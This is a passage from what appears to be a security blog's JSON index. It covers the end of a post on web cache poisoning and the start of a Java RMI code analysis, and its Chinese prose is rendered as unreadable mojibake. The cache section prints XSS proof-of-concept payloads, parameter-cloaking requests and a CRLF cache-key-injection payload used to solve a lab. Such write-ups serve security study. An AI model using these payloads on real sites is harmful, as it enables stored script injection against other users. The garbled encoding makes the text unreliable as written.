å‚æ•°æœ€å¼€å¤´ï¼Œä½†æœ‰äº›åº”ç”¨ä¸ç®¡é—®å·åœ¨å“ªï¼Œéƒ½ä¼šè®¤ä¸ºå®ƒåé¢è·Ÿç€çš„æ˜¯ä¸€ä¸ªå‚æ•°ã€‚æ¯”å¦‚ä¾‹å­ä¸­è¯·æ±‚è¡Œæœ‰ä¸¤ä¸ªé—®å·ï¼Œweb æœåŠ¡å™¨ä¼šæŠŠç¬¬äºŒä¸ªé—®å·çœ‹ä½œ example å‚æ•°çš„ä¸€éƒ¨åˆ†ï¼Œè€Œç¼“å­˜æœåŠ¡å™¨åˆ™è®¤ä¸ºæœ‰ example å’Œ excluded_param ä¸¤ä¸ªå‚æ•°ã€‚é‚£ä¹ˆå½“ç”¨æˆ·è¯·æ±‚ /?example=123 å°±ä¼šè¢«æ”»å‡»ã€‚\nè¿˜æœ‰å¦å¤–ä¸€ç§æƒ…å†µï¼Œweb æœåŠ¡å™¨æ”¯æŒå¤šä¸ªå‚æ•°åˆ†éš”ç¬¦è€Œç¼“å­˜æœåŠ¡å™¨ä¸æ”¯æŒã€‚æ¯”å¦‚ä¸‹é¢çš„è¯·æ±‚ï¼š\nGET /?keyed_param=abc\u0026amp;excluded_param=123;keyed_param=\u0026lt;svg/onload=alert(1)\u0026gt; web æœåŠ¡å™¨æŠŠåˆ†å·çœ‹ä½œå‚æ•°åˆ†éš”ç¬¦ï¼Œå¹¶å–æœ€åä¸€ä¸ªåŒåå‚æ•°çš„å€¼ï¼Œè€Œç¼“å­˜æœåŠ¡å™¨æŠŠåˆ†å·å½“ä½œå‚æ•°å€¼çš„ä¸€éƒ¨åˆ†ã€‚ç”±äº excluded_param ä¸æ˜¯ç¼“å­˜é”®ï¼Œå½“ç”¨æˆ·è¯·æ±‚ /?keyed_param=abc æ—¶å°±ä¼šè¢«æ”»å‡»ï¼Œèµ·åˆ°åœ¨ç¼“å­˜é”®(å‚æ•°)ä¸­æŠ•æ¯’çš„æ•ˆæœã€‚\nåœ¨ä¸‹è¿°åº”ç”¨ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªéç¼“å­˜é”®å‚æ•° utm_content(å¯ä»¥é€šè¿‡ param-miner æ‰¾åˆ°)ï¼Œä¸” web æœåŠ¡å™¨ä¼šç”¨åˆ†å·æ¥åˆ†éš”å‚æ•°ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¯ä»¥è¿›è¡Œå‚æ•°ä¼ªè£…ã€‚\nåœ¨æ—¥å¿—ä¸­æ‰¾åˆ°ä¸€ä¸ª jsonp è¯·æ±‚ï¼Œç”¨ callback å‚æ•°çš„å€¼ä½œä¸ºå‡½æ•°åï¼š\nç”±äº callback å‚æ•°æ˜¯ç¼“å­˜é”®ï¼Œä¸èƒ½ç›´æ¥æŠ•æ¯’ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨ utm_content å®Œæˆå‚æ•°ä¼ªè£…ã€‚\nFat GET Fat GET æŒ‡å¸¦æœ‰è¯·æ±‚ä½“çš„ GET è¯·æ±‚ï¼Œè¯·æ±‚ä½“ä¸­çš„å‚æ•°åœ¨ä¸€äº›ç½‘ç«™ä¸­ä¼šè¢«æ­£å¸¸å¤„ç†ï¼Œè€Œä¸”å¾ˆå¯èƒ½ä¸åŒ…å«åœ¨ç¼“å­˜é”®ä¸­ã€‚\nåŒç† POST è¯·æ±‚ä¹Ÿå¯ä»¥è¿›è¡Œç¼“å­˜æŠ•æ¯’ã€‚\né™æ€èµ„æº é€šè¿‡å‘æ¯’åŒ–é™æ€èµ„æºæ–‡ä»¶(jsã€css ç­‰)æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä¸è¿‡è¿™äº›èµ„æºæ–‡ä»¶åå°„è¯·æ±‚å‚æ•°çš„æƒ…å†µéå¸¸å°‘è§ï¼Œå°±ä¸€ç¬”å¸¦è¿‡äº†ã€‚\ncase1ï¼š\nGET /style.css?excluded_param=123);@importâ€¦ HTTP/1.1 HTTP/1.1 200 OK â€¦ @import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@importâ€¦ case2ï¼š\nGET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1 HTTP/1.1 200 OK Content-Type: text/html â€¦ This request was blocked due toâ€¦alert(1){}*{color:red;} ç¼“å­˜é”®æ ‡å‡†åŒ– å¦‚æœç¼“å­˜æœåŠ¡å™¨å¯¹è¯·æ±‚å‚æ•°åšäº†ä¸€äº›è§£ç å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç¼“å­˜æŠ•æ¯’è®©æ— æ³•åˆ©ç”¨çš„åå°„å‹ xss ç”Ÿæ•ˆã€‚\nä¸€èˆ¬æµè§ˆå™¨å‘é€çš„ç‰¹æ®Šå­—ç¬¦éƒ½ä¼šè¿›è¡Œ URL ç¼–ç ï¼Œå¦‚æœåº”ç”¨æ²¡æœ‰å¯¹å…¶è¿›è¡Œè§£ç ï¼Œå³ä½¿åœ¨å“åº”ä¸­è¿”å›ä¹Ÿæ— æ³•æ„æˆ xss æ”»å‡»ã€‚ä½†å¦‚æœç¼“å­˜æœåŠ¡å™¨åœ¨æ¯”è¾ƒç¼“å­˜é”®æ—¶è¿›è¡Œäº†è§£ç æ“ä½œï¼Œæ¯”å¦‚è®©ä¸‹é¢çš„ä¸¤ä¸ªè¯·æ±‚å‘½ä¸­åŒä¸€ç¼“å­˜ï¼š\n1. GET /example?param=\u0026quot;\u0026gt;\u0026lt;test\u0026gt; 2. GET /example?param=%22%3e%3ctest%3e é‚£æˆ‘ä»¬å¯ä»¥ç”¨ burp å‘é€æœªç¼–ç çš„ payload è¿›è¡ŒæŠ•æ¯’ï¼Œç„¶åè¯±å¯¼ç”¨æˆ·è®¿é—®æ¶æ„ urlã€‚å³ä½¿æµè§ˆå™¨å‘é€äº†ç¼–ç åçš„è¯·æ±‚ï¼Œä¹Ÿä¼šå—åˆ° xss æ”»å‡»ã€‚\nä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæµè§ˆå™¨ä¼šå°†æˆ‘ä»¬çš„ payload ç¼–ç ï¼š\nä¸ºäº†æ‰§è¡Œä»£ç ï¼Œæˆ‘ä»¬ç”¨ burp å‘é€æœªç¼–ç çš„ payloadï¼Œå¹¶è®©å®ƒè¿›å…¥ç¼“å­˜ï¼š\nå½“å…¶ä»–ç”¨æˆ·è®¿é—®æ¶æ„ URL æ—¶ï¼Œå³ä½¿æµè§ˆå™¨å¯¹ payload è¿›è¡Œäº†ç¼–ç ï¼Œä½†ç”±äºç¼“å­˜æœåŠ¡å™¨çš„å¤„ç†ä½¿å®ƒä»ç„¶å‘½ä¸­å¸¦æœ‰æ¶æ„ä»£ç çš„ç¼“å­˜ï¼š\nç¼“å­˜é”®æ³¨å…¥ ç¼“å­˜é”®åŒ…æ‹¬è¯·æ±‚ä¸­çš„å¤šä¸ªéƒ¨åˆ†ï¼Œè€Œä¸”ç»å¸¸ä¼šç®€å•åœ°è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ååšæ¯”è¾ƒã€‚åœ¨çŸ¥é“äº†ä¸åŒå‚æ•°çš„åˆ†éš”ç¬¦çš„å‰æä¸‹ï¼Œå¯ä»¥é€šè¿‡æ³¨å…¥è®©ä¸¤ä¸ªä¸åŒçš„è¯·æ±‚å…·æœ‰ç›¸åŒçš„ç¼“å­˜é”®ã€‚\nå¦‚ä¸‹å›¾ï¼ŒOrigin å¤´ä¸­å­˜åœ¨ xss æ¼æ´ï¼Œä½† Origin å¤´æ˜¯ç¼“å­˜é”®çš„ä¸€éƒ¨åˆ†ï¼Œæ²¡åŠæ³•ç›´æ¥æŠ•æ¯’ã€‚\nGET /path?param=123 HTTP/1.1 Origin: '-alert(1)-'__ HTTP/1.1 200 OK X-Cache-Key: /path?param=123__Origin='-alert(1)-'__ \u0026lt;script\u0026gt;â€¦'-alert(1)-'â€¦\u0026lt;/script\u0026gt; é€šè¿‡æšä¸¾æˆ–è€…å›æ˜¾ç­‰æ–¹å¼ï¼Œå¾—çŸ¥ä¸Šè¿°è¯·æ±‚çš„ç¼“å­˜é”®ç”¨ __ ä½œä¸ºåˆ†éš”ç¬¦åï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹è¯·æ±‚è§¦å‘åå°„å‹ xss(å‘½ä¸­æ¶æ„ç¼“å­˜)ï¼š\nGET /path?param=123__Origin='-alert(1)-'__ HTTP/1.1 HTTP/1.1 200 OK X-Cache-Key: /path?param=123__Origin='-alert(1)-'__ X-Cache: hit \u0026lt;script\u0026gt;â€¦'-alert(1)-'â€¦\u0026lt;/script\u0026gt; Lab: Cache key injection ä¸‹è¿°çš„é¢˜ç›®æ¶‰åŠåˆ°åŒ…æ‹¬ç¼“å­˜é”®æ³¨å…¥åœ¨å†…çš„å¤šä¸ªæ¼æ´ï¼Œå¯ä»¥ç”¨ Pragma: x-get-cache-key å¤´æ¥æ˜¾ç¤ºç¼“å­˜é”®ã€‚\næ‰“å¼€ç½‘é¡µåè§‚å¯Ÿä¸€ä¸‹æ—¥å¿—è®°å½•ï¼Œçº¢æ¡†æ ‡å‡ºäº† lang å‚æ•°çš„ä¼ é€’è¿‡ç¨‹ï¼š\né¦–å…ˆåˆ†æä¸€ä¸‹ localize.js è¯·æ±‚ï¼Œå½“ cors å‚æ•°ä¸º 1ï¼Œå“åº”ä¼šåå°„è¯·æ±‚ä¸­çš„ Origin å¤´ï¼š\nåˆ©ç”¨ CRLF æ”»å‡»ä¿®æ”¹å“åº”ï¼š\nè¿™é‡Œåˆ©ç”¨åˆ°äº†ç¼“å­˜é”®æ³¨å…¥æ”»å‡»ï¼Œä¸Šå›¾æ˜¾ç¤ºçš„ç¼“å­˜é”®æ˜¯ï¼š\n/js/localize.js?lang=en\u0026amp;cors=1$$Origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1) URL å’Œ Origin é—´ä½¿ç”¨ $$ è¿æ¥ï¼Œå°±ç®—æ²¡æœ‰å‘é€ Origin å¤´ï¼Œç¼“å­˜é”®åé¢ä¹Ÿä¼šåŠ ä¸Šè¿æ¥ç¬¦ã€‚æ‰€ä»¥ä¸ºäº†å‘½ä¸­è¿™ä¸ªç¼“å­˜é”®ï¼Œè¦åœ¨ä¸Šå›¾çš„ Origin åé¢åŠ ä¸Š $$ ï¼Œé‚£ä¹ˆå¾—åˆ°çš„ç¼“å­˜é”®å°±æ˜¯ï¼š\n/js/localize.js?lang=en\u0026amp;cors=1$$Origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$ åªè¦è®¿é—®è¿™ä¸ª URL æ—¶åˆ æ‰åé¢çš„ $$ ï¼Œå°±ä¼šå¾—åˆ°å·²ç»è¢«ç¼“å­˜ alert(1) ã€‚\né‚£ä¹ˆä¸‹ä¸€æ­¥è¦è§£å†³çš„æ˜¯æ€ä¹ˆè®©æ­£å¸¸è¯·æ±‚è®¿é—®åˆ°è¿™ä¸ª URLï¼Œæˆ‘ä»¬çŸ¥é“åœ¨ login é¡µé¢ä¼šå¯¼å…¥ localize.jsï¼Œä½†æµ‹è¯•ä¹‹åå‘ç°æ— æ³•æ¯’åŒ–è¿™ä¸ªé¡µé¢ï¼Œè€Œä¸”å®ƒå¯¼å…¥ localize.js æ—¶ä¼šåœ¨åé¢åŠ ä¸Š cors=0 ï¼Œä½¿ CRLF æ”»å‡»å¤±æ•ˆã€‚\nç•™æ„ä¸€ä¸‹æµé‡æ—¥å¿—ï¼Œå¯ä»¥å‘ç°è®¿é—® /login ä¼šè¢«é‡å®šå‘åˆ° /login/ ï¼Œè€Œä¸”æˆ‘ä»¬å¯ä»¥æ§åˆ¶è·¯å¾„å’Œå‚æ•°ï¼Œé‚£ä¹ˆè‡ªç„¶æƒ³åˆ°åˆ©ç”¨å‰æ–‡çš„é‡å®šå‘æ”»å‡»ã€‚\nä½†æ˜¯ lang å‚æ•°æ˜¯ç¼“å­˜é”®ï¼Œæˆ‘ä»¬è¦å…ˆæ‰¾åˆ°å…¶ä»–å¯ä»¥æŠ•æ¯’çš„å‚æ•°ã€‚ç”¨ param-miner æšä¸¾åå‘ç° utm_content ä¸åœ¨ç¼“å­˜é”®ä¸­ï¼Œè€Œä¸”ç”±äºç¼“å­˜æœåŠ¡å™¨å¯¹é—®å·çš„å¤„ç†å­˜åœ¨é—®é¢˜ï¼Œå¯ä»¥è¿›è¡Œå‚æ•°ä¼ªè£…ã€‚ç¤ºæ„å›¾å¦‚ä¸‹ï¼š\nç»“åˆä¹‹å‰ CRLF æ”»å‡»ï¼Œæ„é€ å‡º payloadï¼š\n/login?lang=en?utm_content=x%26cors%3d1$$Origin%3dx%250d%250aContent-Length%3a%25208%250d%250a%250d%250aalert(1)%23 åé¢çš„ %23(#) æ˜¯ä¸ºäº†æ³¨é‡Šæ‰å¯¼å…¥ localize.js æ—¶æœ«å°¾æ·»åŠ çš„ cors=0 ã€‚\nDONEï¼š\næ”»å‡»å†…éƒ¨ç¼“å­˜ ä¸€äº›å¼€å‘æ¡†æ¶å®ç°äº†ç¼“å­˜åŠŸèƒ½ï¼Œåœ¨è¿™ç§ç¼“å­˜å’Œåº”ç”¨åœ¨åŒä¸€æœåŠ¡å™¨çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é¿å…ä¸Šè¿°çš„å¾ˆå¤šç”±æœåŠ¡å™¨å·®å¼‚åŒ–å¼•èµ·çš„ç¼“å­˜çº ç¼ æ¼æ´ã€‚è€Œä¸”å’Œå•ç‹¬çš„ç¼“å­˜æœåŠ¡å™¨ä¸åŒï¼Œåº”ç”¨ç¼“å­˜çš„å¯¹è±¡å¾ˆå¯èƒ½ä¸æ˜¯å®Œæ•´çš„å“åº”ï¼Œè€Œæ˜¯å¤šä¸ªé¢‘ç¹ä½¿ç”¨çš„ç‰‡æ®µã€‚\nåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¹Ÿå°±æ²¡æœ‰æ‰€è°“çš„ç¼“å­˜é”®äº†ï¼Œå› ä¸ºä¸€ä¸ªè¯·æ±‚å¯ä»¥å¯¹åº”å¤šä¸ªç¼“å­˜èµ„æºï¼Œè¿™ä¹Ÿè®©æŠ•æ¯’å˜å¾—å¾ˆæ–¹ä¾¿ã€‚ä½†éš¾ç‚¹åœ¨äºæ€ä¹ˆåˆ¤æ–­åº”ç”¨ç¼“å­˜çš„å­˜åœ¨ï¼Œä»¥åŠç¼“å­˜çš„å†…å®¹ã€‚\nå¦‚æœå“åº”ä¸­åŒ…å«äº†å½“å‰è¯·æ±‚çš„å†…å®¹ä»¥åŠæ—§è¯·æ±‚çš„å†…å®¹ï¼Œåˆæˆ–è€…å“åº”ä¸­å‡ºç°äº†ä½ åœ¨å…¶ä»–è¯·æ±‚å‘é€çš„å†…å®¹ï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½ä½¿ç”¨äº†åº”ç”¨ç¼“å­˜ã€‚\nå¦å¤–æµ‹è¯•åº”ç”¨ç¼“å­˜æ—¶è¦è°¨æ…ï¼Œå› ä¸ºæ²¡æœ‰ cache busterï¼Œå¾ˆå®¹æ˜“å½±å“åˆ°æ­£å¸¸ç”¨æˆ· ğŸ‘ˆ\nhttps://portswigger.net/research/practical-web-cache-poisoning\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://portswigger.net/research/web-cache-entanglement\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2021-03-16","permalink":"https://zrquan.github.io/posts/web-cache/","tags":["web"],"title":"ç¼“å­˜æŠ•æ¯’"},{"content":"RMI 101 RMI(Remote Method Invocation)å³è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œæ˜¯ä¸€ç§åˆ†å¸ƒå¼å¯¹è±¡é€šä¿¡æŠ€æœ¯ï¼Œå®ƒä½¿å®¢æˆ·æœºä¸­çš„ç¨‹åºå¯ä»¥åƒè°ƒç”¨æœ¬åœ°å¯¹è±¡ä¸€æ ·è°ƒç”¨è¿œç¨‹æœåŠ¡æœºçš„å¯¹è±¡æ–¹æ³•ï¼Œè€Œä¸éœ€è¦å…³å¿ƒç½‘ç»œé€šä¿¡çš„ç»†èŠ‚ã€‚\nJava RMI çš„è¿œç¨‹é€šä¿¡è¿‡ç¨‹ä¸­åˆ†ä¸º client å’Œ serverï¼Œè€Œåœ¨ä¸¤ç«¯çš„ç¨‹åºä¸­ï¼Œè´Ÿè´£å¤„ç†é€šä¿¡ç»†èŠ‚çš„å¯¹è±¡åˆ†åˆ«ç§°ä¸º stub å’Œ skeletonã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åºè°ƒç”¨ä¸€ä¸ªè¿œç¨‹å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œå®é™…æ˜¯ç”± stub å¯¹è±¡è·å–ç›¸å…³ä¿¡æ¯å¹¶å‘ skeleton å‘é€è¯·æ±‚ï¼Œskeleton å¯¹è±¡è·å–åˆ°ç»“æœåå†è¿”å›ç»™ stub å¯¹è±¡ï¼Œæœ€åè¿”å›åˆ°æˆ‘ä»¬çš„ä»£ç ä¸­ã€‚\næ­¤å¤–ï¼Œå¹¶ä¸æ˜¯ JVM ä¸­çš„æ‰€æœ‰å¯¹è±¡éƒ½èƒ½è¢«è¿œç¨‹è°ƒç”¨çš„ï¼Œä¸€ä¸ªèƒ½è¢«è¿œç¨‹è°ƒç”¨çš„å¯¹è±¡éœ€è¦å®ç°ä¸€ä¸ªç»§æ‰¿äº† Remote æ¥å£çš„æ¥å£ï¼Œå¹¶ä¸”åœ¨ Registry(æ³¨å†Œä¸­å¿ƒ)æ³¨å†ŒæœåŠ¡ã€‚Client ç«¯åœ¨ Registry æŸ¥è¯¢è¿œç¨‹å¯¹è±¡å¹¶è·å– stub åï¼Œæ‰èƒ½ç›´æ¥å’Œ Server ç«¯è¿›è¡Œé€šä¿¡ã€‚\nä»£ç åˆ†æ ç¤ºä¾‹ä»£ç  ä¸‹é¢é€šè¿‡ç®€å•çš„ç¤ºä¾‹ä»£ç ï¼Œæ¥å®ç° RMI è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯ jdk1.7.0_02\né¦–å…ˆéœ€è¦å®šä¹‰ä¸€ä¸ªå¯ä»¥è¢«è¿œç¨‹è°ƒç”¨çš„ç±»ï¼Œå®ƒè¦ç»§æ‰¿ Remote æ¥å£ã€‚Remote æ¥å£æ˜¯ä¸€ä¸ªç©ºæ¥å£ï¼Œå’Œ Serializable æ¥å£ä¸€æ ·èµ·åˆ°æ ‡è®°çš„ä½œç”¨ï¼Œè¯´æ˜å®ç°å®ƒçš„ç±»å¯ä»¥è¢«è¿œç¨‹è°ƒç”¨ï¼Œå…¶ä¸­çš„æ–¹æ³•éœ€è¦æŠ›å‡º RemoteException å¼‚å¸¸ã€‚\ninterface User extends Remote public interface User extends Remote { void register(String uname) throws RemoteException; boolean login(String pwd) throws RemoteException; String getName() throws RemoteException; } class UserImpl // java.rmi.server.UnicastRemoteObjectçš„æ„é€ å‡½æ•°å°†ç”Ÿæˆstubå’Œskeleton public class UserImpl extends UnicastRemoteObject implements User { String name; // å¿…é¡»æœ‰ä¸€ä¸ªæ˜¾å¼çš„æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”è¦æŠ›å‡ºRemoteExceptionå¼‚å¸¸ public UserImpl() throws RemoteException {}; @Override public void register(String uname) throws RemoteException { this.name = uname; System.out.println(\u0026quot;Register called: username is \u0026quot; + uname); } @Override public boolean login(String pwd) throws RemoteException { System.out.println(\u0026quot;Login succeed, password is \u0026quot; + pwd); return true; } @Override public String getName() throws RemoteException { return this.name; } } æ¥ç€æ˜¯ Server ç«¯çš„å®ç°ç±»ï¼Œåœ¨æ­¤åˆ›å»ºä¸€ä¸ªæ³¨å†Œè¡¨(Registry)å¹¶ç»‘å®šè¿œç¨‹å¯¹è±¡ã€‚\nclass UserServer public class UserServer { public static void main(String[] args) throws Exception{ // é»˜è®¤ç«¯å£æ˜¯tcp 1099 Registry registry = LocateRegistry.createRegistry(3333); registry.bind(\u0026quot;User\u0026quot;, new UserImpl()); System.out.println(\u0026quot;RMI server is ready.\u0026quot;); } } å®é™…ä¸Š Registry å’Œ Server æ˜¯ä¸åŒçš„å®ä½“ï¼Œä½ å¯ä»¥åœ¨ä¸åŒçš„ç±»(æ–‡ä»¶)ä¸­åˆ›å»ºï¼Œåœ¨ä½ç‰ˆæœ¬çš„ JDK ä¸­ç”šè‡³å¯ä»¥æ”¾åœ¨ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼Œä½†é«˜ç‰ˆæœ¬çš„ JDK ä¼šè¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœä¸åœ¨åŒä¸€å°æœåŠ¡å™¨å°±æ— æ³•æ³¨å†ŒæˆåŠŸã€‚\næœ€åæ˜¯ Client ç«¯çš„å®ç°ç±»ï¼Œå®ƒéœ€è¦å…ˆè·å–æ³¨å†Œè¡¨çš„å¼•ç”¨ï¼Œå†é€šè¿‡æ³¨å†Œè¡¨è·å–è¿œç¨‹å¯¹è±¡ã€‚ç”±äºè¦è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•ï¼Œæ‰€ä»¥ Client ç«¯ä¹Ÿéœ€è¦æœ‰è¯¥å¯¹è±¡çš„æ¥å£å®šä¹‰ã€‚\nclass UserClient public class UserClient { public static void main(String[] args) throws Exception{ Registry registry = LocateRegistry.getRegistry(3333); User userClient = (User) registry.lookup(\u0026quot;User\u0026quot;); userClient.register(\u0026quot;zrquan\u0026quot;); userClient.login(\u0026quot;123\u0026quot;); System.out.println(\u0026quot;Username is \u0026quot; + userClient.getName()); } } Register è·å–æ³¨å†Œä¸­å¿ƒæœ‰ä¸¤ç§æ–¹å¼â€”â€”ä¸€ç§æ˜¯ LocateRegistry.createRegistry() ï¼Œåœ¨åˆ›å»ºæ—¶ä»æœ¬åœ°è·å–ï¼›å¦ä¸€ç§æ˜¯ LocateRegistry.getRegistry() ï¼Œå¯ä»¥è¿œç¨‹è·å–æ³¨å†Œä¸­å¿ƒã€‚åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œ server ç«¯ä½¿ç”¨çš„æ˜¯ç¬¬ä¸€ç§æ–¹å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆè·Ÿè¿› createRegistry æ–¹æ³•ã€‚\næ–¹æ³•å®é™…è¿”å›çš„æ˜¯ä¸€ä¸ª RegistryImpl å¯¹è±¡ï¼Œåˆå§‹åŒ–è¯¥å¯¹è±¡æ—¶æ‰§è¡Œå…¶ç§æœ‰æ–¹æ³• setup()\nåœ¨ä¸Šå›¾çš„ LiveRef å¯¹è±¡ä¸­åŒ…å« IPã€ç«¯å£ç­‰ä¿¡æ¯ï¼Œå¹¶å°è£…è¿› UnicastServerRef å¯¹è±¡ï¼Œç„¶åæ‰§è¡Œ UnicastServerRef çš„ exportObject æ–¹æ³•ï¼Œç”Ÿæˆ stub å’Œ skel å¯¹è±¡ã€‚\nå¯¹ç…§ UnicastServerRef å¯¹è±¡çš„æˆå‘˜å˜é‡å’Œè°ƒç”¨æ ˆï¼Œå¯ä»¥çœ‹åˆ°ç»è¿‡å‡ ä¸ª exportObject æ–¹æ³•ä¹‹åæ‰§è¡Œåˆ° TCPTransport çš„ listen æ–¹æ³•ä¸­ã€‚\nä¸Šå›¾çš„ 225 è¡Œè°ƒç”¨ TCPEndpoint.newServerSocket() åå¼€å¯ç«¯å£ç›‘å¬ï¼Œ227 è¡Œè°ƒç”¨ start å¯åŠ¨çº¿ç¨‹ï¼Œæ‰§è¡Œ TCPTransport$AcceptLoop çš„ run æ–¹æ³•ã€‚\næ‰§è¡Œåˆ° ServerSocket.accept() åç¨‹åºé˜»å¡ï¼Œç­‰å¾… server ç«¯æˆ– client ç«¯çš„è¯·æ±‚ã€‚\næ¥ä¸‹æ¥åˆ†æä¸€ä¸‹ LocateRegistry.getRegistry() ï¼Œå®ƒæœ‰å‡ ä¸ªé‡è½½æ–¹æ³•ï¼Œå…·ä½“çš„å®ç°åœ¨ä»¥ä¸‹æ–¹æ³•ä¸­ï¼š\npublic static Registry getRegistry(String host, int port, RMIClientSocketFactory csf) throws RemoteException { Registry registry = null; if (port \u0026lt;= 0) port = Registry.REGISTRY_PORT; if (host == null || host.length() == 0) { try { host = java.net.InetAddress.getLocalHost().getHostAddress(); } catch (Exception e) { host = \u0026quot;\u0026quot;; } } LiveRef liveRef = new LiveRef(new ObjID(ObjID.REGISTRY_ID), new TCPEndpoint(host, port, csf, null), false); RemoteRef ref = (csf == null) ? new UnicastRef(liveRef) : new UnicastRef2(liveRef); return (Registry) Util.createProxy(RegistryImpl.class, ref, false); } å¦‚æœæ²¡æœ‰æä¾› IP å’Œç«¯å£ï¼Œé»˜è®¤ä½¿ç”¨æœ¬æœºåœ°å€å’Œ 1099 ç«¯å£ï¼Œç„¶åå°†å®ƒä»¬å°è£…åˆ° LiveRef å¯¹è±¡ä¸­ï¼Œå’Œ createRegistry æ—¶ç±»ä¼¼ã€‚ä¸è¿‡åé¢å°†è¿™ä¸ªå¯¹è±¡æ”¾å…¥ UnicastRef è€Œä¸æ˜¯ UnicastServerRefã€‚\nè¿›å…¥ createProxy æ–¹æ³•ï¼Œå†åˆ° createStub æ–¹æ³•ï¼š\né€šè¿‡åå°„å¾—åˆ° RegistryImpl_Stub å¯¹è±¡ï¼Œå¹¶å°†è¿œç¨‹é€šä¿¡éœ€è¦çš„ IP å’Œç«¯å£ä¿¡æ¯ä¿å­˜åˆ° ref å±æ€§ä¸­ã€‚\nServer åˆ›å»ºæ³¨å†Œä¸­å¿ƒåï¼Œserver ç«¯é€šè¿‡ bind æ–¹æ³•æ³¨å†Œè¿œç¨‹å¯¹è±¡ã€‚\nregistry.bind(\u0026quot;User\u0026quot;, new UserImpl()); ç„¶è€Œæ­¤æ—¶ registry çº¿ç¨‹å¹¶æ²¡æœ‰æ”¶åˆ° socket è¯·æ±‚ï¼Œä¹Ÿæ²¡æœ‰è§¦å‘ååºåˆ—åŒ–è¿‡ç¨‹ğŸ¤”\nå‰é¢æåˆ°é€šè¿‡ createRegistry è·å–åˆ°çš„æ˜¯ RegistryImpl å¯¹è±¡ï¼Œçœ‹ä¸€ä¸‹å®ƒçš„ bind æ–¹æ³•ï¼š\nç”±æ­¤å¯è§ RegistryImpl å¯¹è±¡æ˜¯å¯¹æœ¬åœ°çš„æ³¨å†Œä¸­å¿ƒè¿›è¡Œæ“ä½œï¼Œè‡ªç„¶ä¸æ¶‰åŠ socket å’Œåºåˆ—åŒ–ï¼Œåªéœ€è¦å°†æ³¨å†Œå¯¹è±¡æ·»åŠ åˆ°å“ˆå¸Œè¡¨(this.bindings)ä¸­å³å¯ã€‚\næ”¹ä¸ºä½¿ç”¨ getRegistry è·å–æ³¨å†Œä¸­å¿ƒï¼Œæ­¤æ—¶è¿”å›çš„æ˜¯ RegistryImpl_Stub å¯¹è±¡ï¼Œå®ƒçš„ bind æ–¹æ³•å¦‚ä¸‹ï¼š\npublic void bind(String var1, Remote var2) throws AccessException, AlreadyBoundException, RemoteException { try { RemoteCall var3 = super.ref.newCall(this, operations, 0, 4905912898345647071L); try { ObjectOutput var4 = var3.getOutputStream(); var4.writeObject(var1); var4.writeObject(var2); } catch (IOException var5) { throw new MarshalException(\u0026quot;error marshalling arguments\u0026quot;, var5); } super.ref.invoke(var3); super.ref.done(var3); } catch (RuntimeException var6) { throw var6; } catch (RemoteException var7) { throw var7; } catch (AlreadyBoundException var8) { throw var8; } catch (Exception var9) { throw new UnexpectedException(\u0026quot;undeclared checked exception\u0026quot;, var9); } } newCall æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•° operations ä¿å­˜ç€ä¸€ä¸ªåˆ—è¡¨ï¼Œå¯¹åº”ç€ registry çš„å„ç§æ“ä½œï¼š\nå¯ä»¥çœ‹åˆ° bind å¯¹åº”çš„ä¸‹æ ‡æ˜¯ 0ï¼Œè€Œæ­¤æ—¶ç¬¬ä¸‰ä¸ªå‚æ•°(opnum)ä¹Ÿæ˜¯ 0ã€‚\nè·Ÿè¿› newCallï¼š\nåœ¨ 193 è¡Œå’Œ registry è¿›è¡Œé€šä¿¡ï¼Œè·å– Connection å¯¹è±¡ï¼Œåœ¨åˆ›å»º StreamRemoteCall å¯¹è±¡æ—¶ä¼ è¿›å‚æ•° 0ï¼Œè®© registry çŸ¥é“è¦æ‰§è¡Œçš„æ˜¯ bind æ“ä½œã€‚\nè¿™æ—¶å€™è·Ÿè¿›ä¸€ä¸‹ registry çš„ä»£ç ï¼Œåœ¨æ‹¿åˆ° socket å¯¹è±¡åç»§ç»­æ‰§è¡Œï¼Œå¹¶åˆ›å»ºä¸€ä¸ª ConnectionHandler çº¿ç¨‹æ¥å¤„ç†è¯·æ±‚ã€‚\nä» ConnectionHandler#run è·Ÿè¿›åˆ° TCPTransport#handleMessagesï¼Œå‡½æ•°æ ˆå¦‚ä¸‹ï¼š\nåœ¨ switch è¯­å¥ä¸­åˆ›å»ºä¸€ä¸ª StreamRemoteCall å¯¹è±¡ï¼Œå¹¶ä¼ å…¥å½“å‰çš„ TCPConnection å¯¹è±¡ï¼š\nè·Ÿè¿› TCPTransport#serviceCallï¼Œè·å– ObjID å’Œ Target å¯¹è±¡ï¼Œç„¶åè°ƒç”¨ UnicastServerRef#dispatch æ–¹æ³•ï¼š\nå½“ this.skel ä¸ä¸º nullï¼Œå°±è°ƒç”¨ UnicastServerRef#oldDispatchï¼š\næ¥ç€æ‰§è¡Œ this.skel.dispatch() ï¼Œå³ 